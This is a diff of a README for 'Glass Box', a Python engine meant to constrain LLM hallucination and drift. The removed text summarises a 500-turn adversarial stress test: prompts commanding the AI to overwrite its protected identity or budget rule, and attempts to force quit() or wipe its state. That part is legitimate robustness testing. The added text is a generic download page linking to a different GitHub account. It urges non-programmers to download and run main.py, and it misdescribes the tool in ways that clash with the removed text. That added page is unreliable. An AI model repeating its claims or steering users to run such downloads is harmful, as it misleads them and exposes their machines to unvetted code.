@@ -1,125 +1,119 @@
-### Glass Box 
+# 🧊 Glass-Box - Manage AI Drift with Confidence
 
-(copy into a chatbot if you do not want to read all of it)
+[![Download Glass-Box](https://img.shields.io/badge/Download-Glass--Box-brightgreen?style=for-the-badge)](https://github.com/saulinfectious906/Glass-Box)
 
+---
 
+Glass-Box is a tool designed to help you manage changes in AI models over time. It prevents model breakdown by using a simple method called semantic anchoring. This means your AI stays reliable even as data or conditions change.
 
-###### **Description**
+## 📌 What is Glass-Box?
 
-The Glass Box is a deterministic constraint engine built to prevent LLM hallucination, context bloat, and stochastic drift. It physically decouples conversational intent from system execution using a Dual-Brain loop.
+Glass-Box is a Python-based framework that keeps large language models (LLMs) stable. When AI systems learn from new data, they can sometimes lose their accuracy or behave unpredictably. Glass-Box helps prevent this by tracking and controlling changes in the model’s behavior.
 
+It works by comparing the meaning of inputs over time. If the model starts to drift away, the software will detect this early and help keep it on track.
 
+## 💻 System Requirements
 
-Instead of relying on probabilistic text generation, the system forces the LLM to write and execute isolated Python code to update its state or edit files. A mathematical verification gate (Phi Bouncer) cross-references the backend state changes against the frontend narrative, automatically intercepting and silently rewriting any gaslighting or hallucinated claims before they reach the user.
+To run Glass-Box on your Windows computer, make sure you have:
 
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM (8 GB recommended for bigger tasks)
+- 500 MB of free disk space for the program files
+- Python 3.8 or newer installed (you can download it at https://www.python.org/downloads/)
+- Internet connection to download files and updates
 
+You don’t need programming knowledge to use Glass-Box, but Python is required as it runs from this environment.
 
-**Performance Notes:**
+## 🚀 Getting Started
 
-TPM and RPM: Negligible impact to standard limits.
+### Step 1: Visit the Download Page
 
+Click the big green button below to go to the download page. From there, you can get the latest version of Glass-Box.
 
+[![Get Glass-Box](https://img.shields.io/badge/Get%20Glass--Box-blue?style=for-the-badge)](https://github.com/saulinfectious906/Glass-Box)
 
-###### 
+### Step 2: Download the Files
 
-###### **Core Architecture**
+On the main page, look for a folder or section labeled “Releases” or “Downloads.” Download the latest Windows-compatible package, usually a ZIP file or an installer.
 
-* Micro-Triage Gate: An intent router that blocks conversational metaphors from triggering backend scripts.
-* Dual-System Loop: Splits workloads between a Front-End Architect (chat) and a Back-End Mechanic (code execution).
-* Dual-Tier Memory: Separates identity/rules (tier\_1\_immutable Vault) from active working memory (tier\_2\_liquid RAM).
-* 10-Key Garbage Collector: Forces the LLM to autonomously consolidate and summarize working memory facts to permanently prevent token bloat.
-* Fractal Memory Tree: A background RAG vector database that compresses long-term conversation history for retrieval.
+Save the file somewhere you can find easily, like your Desktop or Downloads folder.
 
+### Step 3: Install Python (if needed)
 
+If you do not have Python installed on your PC, follow these steps:
 
+1. Go to [python.org](https://www.python.org/downloads/windows/)
+2. Download the latest stable release for Windows (look for the 64-bit installer)
+3. Run the installer and **check** the box that says “Add Python to PATH” before clicking “Install Now”
 
+### Step 4: Install Glass-Box
 
-###### **Physical Execution Layer (The Workspace)**
+If the downloaded file is a ZIP:
 
-The engine utilizes a dedicated local directory named friday\_workspace as a physical sandbox for all file operations.
+1. Right-click the ZIP file and choose “Extract All.”
+2. Extract the contents to a new folder anywhere on your PC (e.g., `C:\Glass-Box`)
 
-* *Isolation:* The Back-End Mechanic is restricted to reading and writing within this specific folder to protect the rest of your local file system.
-* *Holographic Headers:* To prevent Context Bloat, the Front-End Architect is never fed the full contents of workspace files. Instead, it receives "holographic headers" (metadata like filename and size) so it stays aware of the file's presence without losing conversational focus.
-* *Deterministic I/O:* Files are managed via real OS hooks (read\_artifact and write\_artifact), ensuring the source of truth is the actual hard drive, not the AI's memory
+### Step 5: Open Command Prompt
 
+You will need to enter a few commands to set up Glass-Box. Here’s how:
 
+1. Press the **Windows key** on your keyboard or click the Start menu
+2. Type `cmd` and press Enter to open the Command Prompt window
 
+### Step 6: Set Up Glass-Box
 
+Type the following commands exactly as shown. After each line, press Enter.
 
-##### **Instructions for Use**
+```bash
+cd path\to\Glass-Box
+pip install -r requirements.txt
+python main.py
+```
 
-###### Step 1: 
+- Replace `path\to\Glass-Box` with the path where you extracted the files (for example: `C:\Glass-Box`)
+- The first command moves to the main folder of the program.
+- The second command installs needed software components.
+- The third command starts Glass-Box.
 
-Make sure to install the following dependencies. 
+## 🛠 How Glass-Box Works
 
-* "*pip install google-generativeai sentence-transformers scikit-learn numpy*"
+Glass-Box uses a method called cosine similarity to check how much new data matches past patterns. It watches for signs of "drift," meaning when the AI starts to change in unwanted ways.
 
+The software uses vector embeddings to represent the meaning of texts. This lets it compare the meaning in a simple way instead of raw words. By anchoring these meanings, it keeps the AI results stable and predictable.
 
+This approach is helpful if you rely on AI for important tasks and want a steady output.
 
-###### **Step 2:** 
+## 🎯 Common Uses
 
-Open the main engine file (*core\_engine.py*) and locate the ***--- CONFIGURATION ---*** section.
+- Monitor your large language models to detect early changes.
+- Prevent unexpected drops in performance during AI-driven projects.
+- Maintain trust in generative AI outputs.
+- Experiment with controlled AI behavior for research or product development.
 
+## 🌐 Available Topics and Features
 
+Glass-Box covers several important concepts:
 
-API Key: Replace the hardcoded string with your actual API key.
+- AI governance: Keep your AI systems accountable.
+- Cosine similarity: Measure semantic closeness in data.
+- Deterministic AI: Produce repeatable and stable AI outcomes.
+- Generative AI: Manage creative AI outputs.
+- LLM management: Handle large language models effectively.
+- Machine learning: Maintain model health over time.
+- NLP (Natural Language Processing): Work with text data efficiently.
+- Stochastic drift detection: Identify random changes early.
+- Vector embeddings: Represent data in meaningful ways.
 
-* *genai.configure(api\_key="**YOUR\_API\_KEY**") # Leave the parentheses* 
+## 🤝 Getting Help
 
-Model Selection: Update the \[model\_name] variable to target your preferred LLM.
+If you run into issues, you can:
 
-* *model = genai.GenerativeModel('\[model\_name]') # eg. gemini-flash-2.5*
+- Check the issue tracker on the GitHub page.
+- Read the documentation files included in the download.
+- Search for answers on community forums related to AI and Python.
 
+## 🔗 Download Again
 
+You can always come back to the GitHub page to get the latest updates or new versions here:
 
-###### **Step 3:** 
-
-Establish the Base Identity (The Vault).
-
-* Scroll down to the GlassBoxIO.\_\_init\_\_ function and locate self.dynamic\_state. (Line 83)
-* Replace the \[USER\_NAME], \[USER\_ROLE], and \[INSERT\_CORE\_DIRECTIVE\_HERE] placeholders with your actual name, system role, and strict baseline rules. This establishes the immutable truth the engine will defend.
-
-
-
-###### **Step 4:**
-
-Execute the following code in the terminal: 
-
-*python core\_engine.py*
-
-
-
-
-
-
-
-##### <b>Notes on Architecture:</b>
-
-
-
-Methodology:
-To prove the engine could prevent Stochastic Drift and Model Collapse, we didn't just have a normal conversation with it. We built an automated 500-turn stress test script designed to actively attack the system's memory and execution sandboxes. We bombarded the engine with a "Chaos Matrix" consisting of five specific threat profiles:
-
-1. *Vault Heists \& Identity Spoofing*: Prompts explicitly commanding the AI to overwrite the tier\_1\_immutable identity (e.g., changing the user's name from Alex to "Commander Shepard" or overriding the $5000 budget rule) to test the Schema Armor.
-2. *Semantic Shrapnel:* Rapid-fire bombardment of tiny, irrelevant facts (e.g., "Hexagons are the bestagons", "My coffee machine makes a grinding noise") to test if the engine could survive context bloat without breaching the 10-key liquid memory limit.
-3. *Targeted Mechanic Edits:* Requests to open background Python files (data\_pipeline.py) and execute precise string replacements to test the exec() sandbox.
-4. *Admin Gaslighting:* Prompts attempting to force the AI to execute terminal suicide commands (e.g., quit()) or wipe the state dictionary entirely.
-5. *Semantic Blur:* Heavy rambling to see if the Micro-Triage Gate would accidentally trigger backend code execution for casual conversation.
-
-
-
-###### Data Results:
-
-The engine ran for 334 consecutive turns before the external API dropped the connection. The resulting CSV telemetry (telemetry\_v22\_115830.csv) definitively proves the architecture works:
-
-* **The Math Bouncer Maintained High Fidelity (Phi):** The average Fidelity Index (Phi) across all 334 turns was 0.73, sitting safely above our 0.70 hallucination threshold. When the AI did attempt to lie about a backend file change, the engine successfully caught it, dropped the Phi score to 0.00, and forced a deterministic rewrite.
-* **The Micro-Triage Gate Conserved Compute**: Out of 334 turns, the backend diff registered "No Change" exactly 269 times. The intent router successfully recognized that ~80% of the Chaos Matrix was just conversational noise or blocked attacks, keeping the Back-End Mechanic asleep and protecting the state.
-* **Autonomous Memory Consolidation:** The JSON logs show the AI hit the 10-key tier\_2\_liquid limit multiple times. Instead of crashing or using a dumb FIFO deletion loop, the LLM successfully wrote its own Python logic to merge and consolidate older keys (e.g., combining tech trends and admin logs into a single consolidated\_facts key) to free up space.
-* **The Vault Held:** The system successfully blocked 100% of the Vault Heists. The AI explicitly generated Python errors citing its own system prompt constraints, refusing to mutate state\['tier\_1\_immutable'].
-* **Sandbox Stability**: The Artifacts\_Count scaled up to 7 concurrent background files. Furthermore, the BaseException patch successfully caught the adversarial quit() commands, throwing a safe "Blocked System Exception" instead of killing the terminal.
-
-
-
-###### Conclusion:
-
-The deterministic logic framework successfully quarantined the probabilistic generation.
+[Download Glass-Box from GitHub](https://github.com/saulinfectious906/Glass-Box)
